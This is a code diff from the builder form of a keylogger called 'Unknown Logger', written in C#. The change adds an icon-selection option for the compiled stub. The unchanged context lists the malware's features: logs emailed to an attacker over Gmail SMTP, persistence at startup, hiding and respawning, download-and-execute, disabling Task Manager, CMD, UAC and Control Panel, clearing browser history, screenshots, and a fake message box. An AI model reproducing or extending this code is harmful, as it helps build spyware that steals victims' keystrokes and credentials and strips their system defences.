@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Windows.Forms;
+using UnknownLibrary;
 using UnknownLibrary.SMTP;
 using UnknownLibrary.FakeMessageBox;
 using UnknownLibrary.Stub;
@@ -11,7 +12,6 @@ namespace Unknown_Logger.Forms
     public partial class KeyloggerForm : MetroFramework.Forms.MetroForm
     {
         string DefaultGoogleSMTPServer = "smtp.gmail.com", DefaultSubject = "Message from Unknown Keylogger", DefaultBody = "Hello there, if you received this email Unknown Logger is working correctly.", LessSecureAppsLink = "https://www.google.com/settings/security/lesssecureapps";
-
         private void TB_DownloadAndExecuteLink_TextChanged(object sender, EventArgs e)
         {
             if (TB_DownloadAndExecuteLink.Text != string.Empty)
@@ -64,7 +64,7 @@ namespace Unknown_Logger.Forms
                 CB_AddToStartup.Checked, CB_Hide.Checked, CB_Respawner.Checked, CB_DownloadAndExecute.Checked, CB_SiteVisitor.Checked, CB_SilentSiteVisitor.Checked,
                 CB_ClearChromeAndFirefoxHistory.Checked, CB_DisableTaskManager.Checked, CB_DisableCMD.Checked, CB_DisableUAC.Checked, CB_DisableControlPanel.Checked,
                 CB_LogScreenShot.Checked, CB_FakeMessageBox.Checked, TB_FakeMessageboxName.Text, TB_FakeMessageboxText.Text, CB_MessageboxOption.Text, CB_MessageboxIcon.Text,
-                TB_EMailTo.Text, TB_EMailFrom.Text, TB_EMailPassword.Text, Convert.ToInt32(NUD_EMailSendingIntervals.Value * 60000), TB_SMTPServer.Text, TB_SMTPPort.Text);
+                TB_EMailTo.Text, TB_EMailFrom.Text, TB_EMailPassword.Text, Convert.ToInt32(NUD_EMailSendingIntervals.Value * 60000), TB_SMTPServer.Text, TB_SMTPPort.Text, TB_AssemblyIconLocation.Text);
             if (Success)
             {
                 UnknownLibrary.Unknown.CreateLog(LB_StubBuildLogs, TB_AssemblyTitle.Text + " has successfully compiled!", true);
@@ -78,6 +78,16 @@ namespace Unknown_Logger.Forms
         private void TB_EMailTo_TextChanged_1(object sender, EventArgs e)
         {
             TB_EMailFrom.Text = TB_EMailTo.Text;
+        }
+
+        private void BTN_OpenIconLocation_Click(object sender, EventArgs e)
+        {
+            TB_AssemblyIconLocation.Text = Unknown.GetFilePath("Ico Files(*.ico) | All Files(*.*)");
+        }
+
+             private void KeyloggerForm_Load(object sender, EventArgs e)
+        {
+            MTC_KeyloggerTabControl.SelectedIndex = 0;
         }
 
         private void TB_EMailTo_TextChanged(object sender, EventArgs e)
